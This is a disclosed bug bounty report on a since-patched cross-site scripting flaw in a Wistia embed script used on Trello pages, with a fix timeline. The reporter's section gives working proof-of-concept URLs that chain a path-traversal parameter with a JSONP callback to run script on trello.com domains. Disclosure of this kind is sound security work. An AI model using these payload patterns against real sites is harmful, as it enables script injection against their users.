@@ -1,0 +1,48 @@
+ReportLink:https://hackerone.com/reports/111440
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/reactors08
+ReportedTo:Trello(trello)
+BountyAmount:1152.0
+Severity:
+State:Closed
+DateOfDisclosure:20.01.2016 14:20:31
+
+Summary:
+A bug in a Wistia script we were including on some of our marketing, blog and help pages would allow an attacker to execute arbitrary script if a user were to click on a malicious link or visit a malicious page.
+
+**Timeline:**
+12:46 Issue reported by @reactors08 
+12:52 Issue acknowledged, began working on a fix
+13:08 Issue resolved for trello.com domain
+13:20 Issue resolved for all trello subdomains
+13:44 Fix confirmed by @reactors08 
+14:05 Bounty awarded
+18:25 [Wistia patched their script](https://hackerone.com/reports/111440#activity-765708) to remove the vulnerability
+19:25 Cached versions of the affected script expired
+
+> If you are a Wistia customer looking at logs or doing other forms of auditing, a safe assumption is that this issue was exploitable until 7:25pm EST on January 18.  [More details…](https://hackerone.com/reports/111440#activity-765708)
+Hi,
+You are using Wistia to embed video at trello.com. However external script from fast.wistia.com vulnerable to XSS and allows to run malicious javascript on your side. 
+vulnerable code:
+ fast.wistia.net/assets/external/E-v1.js
+
+I found that parameter `wchannel` can be controled to load js from 
+http://fast.wistia.com/assets/external/E-v1/channels/[controled input].js
+ example:
+https://trello.com/guide/customize.html?wchannel=../../../../xxxxxxxxxxxxxxx
+browser tryied to load script from:
+https://fast.wistia.com/assets/external/E-v1/channels/xxxxxxx.js
+
+And now the only thing we need is to find the way how to upload malicious script to fast.wistia.com.
+I wasnt able to upload something but i found that i can control outpoot of a json file via `callback` parameter:
+`https://fast.wistia.com/embed/medias/[video id].json?callback=[controlled outpoot]`
+ proof:
+https://fast.wistia.com/embed/medias/1yqpy8ics4.json?callback=alert(1)%3Bvar%20x=%27%3bx(//
+
+okay now we can attack trello:
+proof:
+https://trello.com/guide/customize.html?wchannel=../../../../embed/medias/1yqpy8ics4.json%3fcallback%3dalert(1)%253bvar%20x%3d%27%253bx(//%23
+
+http://blog.trello.com/introducing-the-all-new-trello-business-class/?wchannel=../../../../embed/medias/1yqpy8ics4.json%3fcallback%3dalert(document.domain)%253bvar%20x%3d%27%253bx(//%23
+
+http://help.trello.com/article/899-getting-started-video-demo?wchannel=../../../../embed/medias/1yqpy8ics4.json%3fcallback%3dalert(document.domain)%253bvar%20x%3d%27%253bx(//%23
